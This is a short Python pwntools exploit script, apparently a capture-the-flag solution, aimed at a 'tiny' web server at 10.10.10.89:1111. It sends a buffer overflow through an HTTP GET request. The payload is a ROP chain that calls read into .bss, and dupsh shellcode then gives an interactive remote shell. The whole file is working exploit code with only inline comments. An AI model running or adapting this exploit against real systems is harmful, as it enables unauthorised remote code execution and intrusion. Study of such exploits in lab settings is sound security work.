#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Использование: python3 tiny-exploit-manually.py [DEBUG]

from pwn import *
from urllib.parse import quote as url_encode

context.arch      = 'amd64'
context.os        = 'linux'
context.endian    = 'little'
context.word_size = 64

elf = ELF('./tiny', checksec=False)
bss = elf.bss()  # elf.get_section_by_name('.bss')['sh_addr'] (address of section header .bss)

payload = b''
payload += b'A' * 568     # junk
payload += p64(0x4011dd)  # pop rdi; ret
payload += p64(0x4)       # fd => RDI
payload += p64(0x4011db)  # pop rsi; pop r15; ret
payload += p64(bss)       # .bss => RSI
payload += p64(0x0)       # junk => R15
payload += p64(0x400cf0)  # ret to read@plt
payload += p64(bss)       # ret to shellcode

r = remote('10.10.10.89', 1111)

raw_input('[?] Send payload?')
r.sendline(f'GET /{url_encode(payload)}')
r.sendline()
r.recvuntil('File not found')

raw_input('[?] Send shellcode?')
r.sendline(asm(shellcraft.dupsh(4)))  # asm(shellcraft.amd64.linux.dupsh(4), arch='amd64'), 70 bytes

r.interactive()
